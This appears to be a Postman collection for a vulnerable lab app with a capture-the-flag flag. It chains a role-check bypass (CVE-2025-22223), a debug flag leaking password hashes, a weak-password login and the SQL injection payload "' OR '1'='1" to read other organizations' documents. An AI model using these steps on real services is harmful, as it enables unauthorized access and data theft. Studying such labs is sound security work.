{
  "info": {
    "name": "OrgArchive — signup to cross-organization document access",
    "description": "Run the 11 requests in order. Sign up as a normal user, use CVE 1 to read the admin-only users list, then search documents as Anna. Anna’s weak lab password is already set in annaPassword.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "variable": [
    {
      "key": "gatewayUrl",
      "value": "http://localhost:8080"
    },
    {
      "key": "username",
      "value": ""
    },
    {
      "key": "password",
      "value": ""
    },
    {
      "key": "userOrganization",
      "value": ""
    },
    {
      "key": "annaPassword",
      "value": "sunshine"
    }
  ],
  "item": [
    {
      "name": "1 · Discover API endpoints",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/",
        "description": "",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const api = pm.response.json();",
              "pm.expect(api.service).to.equal('OrgArchive');",
              "['/signup','/users','/notes','/organizations/{organization}/notes','/documents/search'].forEach(path => pm.expect(api.endpoints.some(e => e.path === path)).to.be.true);"
            ]
          }
        }
      ]
    },
    {
      "name": "2 · Anonymous /users → 401",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users",
        "description": "",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(401);"
            ]
          }
        }
      ]
    },
    {
      "name": "3 · Anonymous /notes → 401",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(401);"
            ]
          }
        }
      ]
    },
    {
      "name": "4 · Sign up as a normal user",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/signup",
        "description": "",
        "auth": {
          "type": "noauth"
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"username\": \"{{username}}\",\n  \"displayName\": \"Demo User\",\n  \"email\": \"{{username}}@example.test\",\n  \"password\": \"{{password}}\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "prerequest",
          "script": {
            "type": "text/javascript",
            "exec": [
              "const suffix = Math.random().toString(36).slice(2, 10);",
              "pm.collectionVariables.set('username', 'user-' + suffix);",
              "pm.collectionVariables.set('password', 'UserPass!' + suffix + '9');"
            ]
          }
        },
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(201);",
              "const account = pm.response.json();",
              "pm.expect(account.username).to.equal(pm.collectionVariables.get('username'));",
              "pm.expect(account.organization).to.match(/^trial-/);",
              "pm.collectionVariables.set('userOrganization', account.organization);"
            ]
          }
        }
      ]
    },
    {
      "name": "5 · My organization notes → empty",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/organizations/{{userOrganization}}/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{username}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{password}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
            ]
          }
        }
      ]
    },
    {
      "name": "6 · CVE 1 · Normal user accesses admin /users",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users",
        "description": "First unauthorized access: the newly registered USER receives the admin-only user list because CVE-2025-22223 skips the inherited role check.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{username}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{password}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const users = pm.response.json();",
              "pm.expect(users).to.be.an('array');",
              "pm.expect(users.length).to.be.above(0);",
              "pm.expect(users.some(u => u.username === 'anna')).to.be.true;",
              "pm.expect(users.some(u => u.role === 'admin')).to.be.true;",
              "pm.expect(users.find(u => u.username === 'anna').organization).to.equal('atlas-consulting');",
              "pm.expect(users.some(u => u.organization === 'harbor-delivery')).to.be.true;"
            ]
          }
        }
      ]
    },
    {
      "name": "7 · Users with debug flag → password hashes",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users?debug=true",
        "description": "The debug=true flag exposes BCrypt hashes for every user. Anna’s weak password is already stored in the collection variable annaPassword for the next requests.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{username}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{password}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const users = pm.response.json();",
              "pm.expect(users.length).to.be.above(1);",
              "users.forEach(u => pm.expect(u.passwordHash).to.match(/^\\$2[aby]\\$/));"
            ]
          }
        }
      ]
    },
    {
      "name": "8 · Anna document search → own organization",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "anna",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{annaPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"organization\": \"atlas-consulting\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const docs = pm.response.json();",
              "pm.expect(docs.length).to.be.above(0);",
              "pm.expect(docs.every(d => JSON.parse(d.metadata).organization === 'atlas-consulting')).to.be.true;"
            ]
          }
        }
      ]
    },
    {
      "name": "9 · Anna searches another organization → empty",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "anna",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{annaPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"organization\": \"harbor-delivery\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
            ]
          }
        }
      ]
    },
    {
      "name": "10 · CVE 2 · SQL injection reveals all organizations",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "anna",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{annaPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const organizations = new Set(pm.response.json().map(d => JSON.parse(d.metadata).organization));",
              "['atlas-consulting','harbor-delivery','cedar-partners','siteworks-group','meridian-legal'].forEach(o => pm.expect(organizations.has(o)).to.be.true);",
              "pm.expect(pm.response.text()).to.include('FLAG{archive-isolation-broken-by-converter}');"
            ]
          }
        }
      ]
    },
    {
      "name": "11 · Safe search with the same input → empty",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search-safe",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "anna",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{annaPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
            ]
          }
        }
      ]
    }
  ]
}
